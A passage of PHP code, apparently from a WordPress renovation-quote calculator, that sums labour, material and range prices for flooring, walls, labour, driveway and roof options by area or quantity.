                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_total = $current_total +  ( $labour_and_material_total * $floor_area);
                                }
                                elseif($current_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_total = $current_total + ( $range_price_total * $floor_area);
                                }

                        }

                }

	
	              $proposed = $data['proposed'];
                $proposed_total = 0;
                foreach($proposed_data as $temp) {
                        if( $temp['title'] == $proposed ) {


                                if($proposed_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $proposed_total = $proposed_total +  ( $labour_and_material_total * $floor_area);
                                }
                                elseif($proposed_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $proposed_total = $proposed_total + ( $range_price_total * $floor_area);
                                }

                        }

                }

	              $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extras field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

	                              $floor_total = $current_total + $proposed_total;
					                      $vinyl_floor_total = $floor_total + $extras_total + $supply_total;

                                $total = $total + $vinyl_floor_total;


                }

        
	// formulas for walls
        if(get_the_title($t) == 'Walls') {

                                $all_scope_data = get_field('quote_fields',$t);

                                $width = $data[$total_slug . '_area_width_' . $rooms];
                                $height = $data[$total_slug . '_area_height_' . $rooms];

                                foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'wall_type') {
                                                $wall_type_title = $d['title'];
                                                $wall_type_prices = $d['type_of_price'];
                                                $wall_type_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'open') {
                                                $open_title = $d['title'];
                                                $open_prices = $d['type_of_price'];
                                                $open_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'clad') {
                                                $clad_title = $d['title'];
                                                $clad_prices = $d['type_of_price'];
                                                $clad_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'line') {
                                                $line_title = $d['title'];
                                                $line_prices = $d['type_of_price'];
                                                $line_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'paint') {
                                                $paint_title = $d['title'];
                                                $paint_prices = $d['type_of_price'];
                                                $paint_data = $d['fields'];
                                        }
																}

	              $wall_area = $width * $height;

                $wall_type = $data['wall_type'];
                $wall_type_total = 0;
                foreach($wall_type_data as $temp) {
                        if( in_array($temp['title'],$wall_type) ) {

                                // let's count QNT of each wall_type field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $wall_type_count = $data['' . $count_field_title . ''];
                                if($wall_type_count == NULL || $wall_type_count == '' || empty($wall_type_count)) {
                                       $wall_type_count = 1;
                                }

                                if($wall_type_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$wall_type_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $wall_type_total = $wall_type_total +  ( $labour_and_material_total * $wall_type_count);
                                }
                                elseif($wall_type_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $wall_type_total = $wall_type_total + ( $range_price_total * $wall_type_count);
                                }

                        }

                }
                $open = $data['open'];
                $open_total = 0;
                foreach($open_data as $temp) {
                        if( in_array($temp['title'],$open) ) {

                                // let's count QNT of each open field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $open_count = $data['' . $count_field_title . ''];
                                if($open_count == NULL || $open_count == '' || empty($open_count)) {
                                       $open_count = 1;
                                }

                                if($open_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$open_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $open_total = $open_total +  ( $labour_and_material_total * $open_count);
                                }
                                elseif($open_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $open_total = $open_total + ( $range_price_total * $open_count);
                                }

                        }

                }

                $clad = $data['clad'];
                $clad_total = 0;
                foreach($clad_data as $temp) {
                        if( in_array($temp['title'],$clad) ) {

                                // let's count QNT of each clad field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $clad_count = $data['' . $count_field_title . ''];
                                if($clad_count == NULL || $clad_count == '' || empty($clad_count)) {
                                       $clad_count = 1;
                                }

                                if($clad_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$clad_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $clad_total = $clad_total +  ( $labour_and_material_total * $clad_count);
                                }
                                elseif($clad_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $clad_total = $clad_total + ( $range_price_total * $clad_count);
                                }

                        }

                }
	              $line = $data['line'];
                $line_total = 0;
                foreach($line_data as $temp) {
                        if( in_array($temp['title'],$line) ) {

                                // let's count QNT of each line field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $line_count = $data['' . $count_field_title . ''];
                                if($line_count == NULL || $line_count == '' || empty($line_count)) {
                                       $line_count = 1;
                                }

                                if($line_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$line_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $line_total = $line_total +  ( $labour_and_material_total * $line_count);
                                }
                                elseif($line_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $line_total = $line_total + ( $range_price_total * $line_count);
                                }

                        }

                }

                $paint = $data['paint'];
                $paint_total = 0;
                foreach($paint_data as $temp) {
                        if( in_array($temp['title'],$paint) ) {

                                // let's count QNT of each paint field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $paint_count = $data['' . $count_field_title . ''];
                                if($paint_count == NULL || $paint_count == '' || empty($paint_count)) {
                                       $paint_count = 1;
                                }

                                if($paint_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$paint_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $paint_total = $paint_total +  ( $labour_and_material_total * $paint_count);
                                }
                                elseif($paint_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $paint_total = $paint_total + ( $range_price_total * $paint_count);
                                }

                        }

                }

	                              $walls_total = ( $wall_type_total + $clad_total + $line_total + $paint_total ) * $wall_area;

                                $total = $total + $walls_total;


                }

         // formulas for labour
        if(get_the_title($t) == 'Labour') {

                                $all_scope_data = get_field('quote_fields',$t);

                                foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'build') {
                                                $build_title = $d['title'];
                                                $build_prices = $d['type_of_price'];
                                                $build_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'plumb') {
                                                $plumb_title = $d['title'];
                                                $plumb_prices = $d['type_of_price'];
                                                $plumb_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'elec') {
                                                $elec_title = $d['title'];
                                                $elec_prices = $d['type_of_price'];
                                                $elec_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'design') {
                                                $design_title = $d['title'];
                                                $design_prices = $d['type_of_price'];
                                                $design_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'misc') {
                                                $misc_title = $d['title'];
                                                $misc_prices = $d['type_of_price'];
                                                $misc_data = $d['fields'];
                                        }

																}


                                $build = $data['build'];
                                $build_total = 0;
                                foreach($build_data as $temp) {
                                if( in_array($temp['title'],$build) ) {

                                // let's count QNT of each build field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $build_count = $data['' . $count_field_title . ''];
                                if($build_count == NULL || $build_count == '' || empty($build_count)) {
                                       $build_count = 1;
                                }

                                if($build_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$build_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $build_total = $build_total +  ( $labour_and_material_total * $build_count);
                                }
                                elseif($build_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $build_total = $build_total + ( $range_price_total * $build_count);
                                }

                        }

                }

                                $plumb = $data['plumb'];
                                $plumb_total = 0;
                                foreach($plumb_data as $temp) {
                                if( in_array($temp['title'],$plumb) ) {

                                // let's count QNT of each plumb field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $plumb_count = $data['' . $count_field_title . ''];
                                if($plumb_count == NULL || $plumb_count == '' || empty($plumb_count)) {
                                       $plumb_count = 1;
                                }

                                if($plumb_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$plumb_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $plumb_total = $plumb_total +  ( $labour_and_material_total * $plumb_count);
                                }
                                elseif($plumb_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $plumb_total = $plumb_total + ( $range_price_total * $plumb_count);
                                }

                        }

                }


                                $elec = $data['elec'];
                                $elec_total = 0;
                                foreach($elec_data as $temp) {
                                if( in_array($temp['title'],$elec) ) {

                                // let's count QNT of each elec field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $elec_count = $data['' . $count_field_title . ''];
                                if($elec_count == NULL || $elec_count == '' || empty($elec_count)) {
                                       $elec_count = 1;
                                }

                                if($elec_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$elec_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $elec_total = $elec_total +  ( $labour_and_material_total * $elec_count);
                                }
                                elseif($elec_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $elec_total = $elec_total + ( $range_price_total * $elec_count);
                                }

                        }

                }

                                $plumb = $data['plumb'];
                                $plumb_total = 0;
                                foreach($plumb_data as $temp) {
                                if( in_array($temp['title'],$plumb) ) {

                                // let's count QNT of each plumb field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $plumb_count = $data['' . $count_field_title . ''];
                                if($plumb_count == NULL || $plumb_count == '' || empty($plumb_count)) {
                                       $plumb_count = 1;
                                }

                                if($plumb_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$plumb_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $plumb_total = $plumb_total +  ( $labour_and_material_total * $plumb_count);
                                }
                                elseif($plumb_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $plumb_total = $plumb_total + ( $range_price_total * $plumb_count);
                                }

                        }

                }

                                $design = $data['design'];
                                $design_total = 0;
                                foreach($design_data as $temp) {
                                if( in_array($temp['title'],$design) ) {

                                // let's count QNT of each design field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $design_count = $data['' . $count_field_title . ''];
                                if($design_count == NULL || $design_count == '' || empty($design_count)) {
                                       $design_count = 1;
                                }

                                if($design_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                       // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$desing_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $design_total = $design_total +  ( $labour_and_material_total * $design_count);
                                }
                                elseif($design_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $design_total = $design_total + ( $range_price_total * $design_count);
                                }

                        }

                }

                                $misc = $data['misc'];
                                $misc_total = 0;
                                foreach($misc_data as $temp) {
                                if( in_array($temp['title'],$misc) ) {

                                // let's count QNT of each misc field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $misc_count = $data['' . $count_field_title . ''];
                                if($misc_count == NULL || $misc_count == '' || empty($misc_count)) {
                                       $misc_count = 1;
                                }

                                if($misc_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$misc_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***


                                        $misc_total = $misc_total +  ( $labour_and_material_total * $misc_count);
                                }
                                elseif($misc_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $misc_total = $misc_total + ( $range_price_total * $misc_count);
                                }

                        }

                }

	                              $labour_total = $build_total + $plumb_total + $elec_total + $design_total + $misc_total;
                                $total = $total + $labour_total;


                }

        // formulas for driveway
        if(get_the_title($t) == 'Driveway') {

                                $all_scope_data = get_field('quote_fields',$t);

                                $width = $data[$total_slug . '_area_width_' . $rooms];
                                $length = $data[$total_slug . '_area_length_' . $rooms];
                                $curblength = $data[$total_slug . '_area_length_' . $rooms];


                                foreach($all_scope_data as $d) {
                                         if($d['slug'] == 'type') {
                                                $type_title = $d['title'];
                                                $type_prices = $d['type_of_price'];
                                                $type_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'finish') {
                                                $finish_title = $d['title'];
                                                $finish_prices = $d['type_of_price'];
                                                $finish_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'curb_type') {
                                                $curb_type_title = $d['title'];
                                                $curb_type_prices = $d['type_of_price'];
                                                $curb_type_data = $d['fields'];
                                        }
																}


	                              $floor_area = $width * $length;

                                $type = $data['type'];
                                $type_total = 0;
                                foreach($type_data as $temp) {
                                if( in_array($temp['title'],$type) ) {

                                // let's count QNT of each type field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $type_count = $data['' . $count_field_title . ''];
                                if($type_count == NULL || $type_count == '' || empty($type_count)) {
                                       $type_count = 1;
                                }

                                if($type_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$type_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $type_total = $type_total +  ( $labour_and_material_total * $type_count);
                                }
                                elseif($type_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $type_total = $type_total + ( $range_price_total * $type_count);
                                }

                        }

                }

	              $finish = $data['finish'];
                $finish_total = 0;
                foreach($finish_data as $temp) {
                        if( in_array($temp['title'],$finish) ) {

                                // let's count QNT of each finish field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $finish_count = $data['' . $count_field_title . ''];
                                if($finish_count == NULL || $finish_count == '' || empty($finish_count)) {
                                       $finish_count = 1;
                                }

                                if($finish_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$finish_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $finish_total = $finish_total +  ( $labour_and_material_total * $finish_count);
                                }
                                elseif($finish_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $finish_total = $finish_total + ( $range_price_total * $finish_count);
                                }

                        }

                }

                $curb_type = $data['curb_type'];
                $curb_type_total = 0;
                foreach($curb_type_data as $temp) {
                        if( in_array($temp['title'],$curb_type) ) {

                                // let's count QNT of each curb_type field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $curb_type_count = $data['' . $count_field_title . ''];
                                if($curb_type_count == NULL || $curb_type_count == '' || empty($curb_type_count)) {
                                       $curb_type_count = 1;
                                }

                                if($curb_type_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$curb_type_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $curb_type_total = $curb_type_total +  ( $labour_and_material_total * $curb_type_count);
                                }
                                elseif($curb_type_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $curb_type_total = $curb_type_total + ( $range_price_total * $curb_type_count);
                                }

                        }

                }


	                              $concrete_total = ( $type_total + $finish_total ) * $floor_area;
                                $curb_total = $curb_type_total * $curblength;
                                $driveway_total = $concrete_total + $curb_total;

                                $total = $total + $driveway_total;


                }

   // formulas for roof
        if(get_the_title($t) == 'Roof') {

                                $all_scope_data = get_field('quote_fields',$t);

                                $width = $data[$total_slug . '_area_width_' . $rooms];
                                $length = $data[$total_slug . '_area_length_' . $rooms];
                                $spouting = $data[$total_slug . '_spout_length_' . $rooms];

                                foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'ceiling_height') {
                                                $height_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'framing') {
                                                $framing_title = $d['title'];
                                                $framing_prices = $d['type_of_price'];
                                                $framing_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'complex') {
                                                $complex_title = $d['title'];
                                                $complex_prices = $d['type_of_price'];
                                                $complex_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'clad') {
                                                $clad_title = $d['title'];
                                                $clad_prices = $d['type_of_price'];
                                                $clad_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'soffit') {
                                                $soffit_title = $d['title'];
                                                $soffit_prices = $d['type_of_price'];
                                                $soffit_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'spout_type') {
                                                $spout_type_title = $d['title'];
                                                $spout_type_prices = $d['type_of_price'];
                                                $spout_type_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'down') {
                                                $down_title = $d['title'];
                                                $down_prices = $d['type_of_price'];
                                                $down_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'down_type') {
                                                $down_type_title = $d['title'];
                                                $down_type_prices = $d['type_of_price'];
                                                $down_type_data = $d['fields'];
                                        }
																}

                                $roof_area = $width * $length;
                                $soffit_length = $width + $width + $length + $length;

                $framing = $data['framing'];
                $framing_total = 0;
                foreach($framing_data as $temp) {
                        if( in_array($temp['title'],$framing) ) {

                                // let's count QNT of each framing field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $framing_count = $data['' . $count_field_title . ''];
                                if($framing_count == NULL || $framing_count == '' || empty($framing_count)) {
                                       $framing_count = 1;
                                }

                                if($framing_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$framing_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $framing_total = $framing_total +  ( $labour_and_material_total * $framing_count);
                                }
                                elseif($framing_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $framing_total = $framing_total + ( $range_price_total * $framing_count);
                                }

                        }

                }

	              $complex = $data['complex'];
                $complex_total = 0;
                foreach($complex_data as $temp) {
                        if( in_array($temp['title'],$complex) ) {

                                // let's count QNT of each complex field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $complex_count = $data['' . $count_field_title . ''];
                                if($complex_count == NULL || $complex_count == '' || empty($complex_count)) {
                                       $complex_count = 1;
                                }

                                if($complex_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
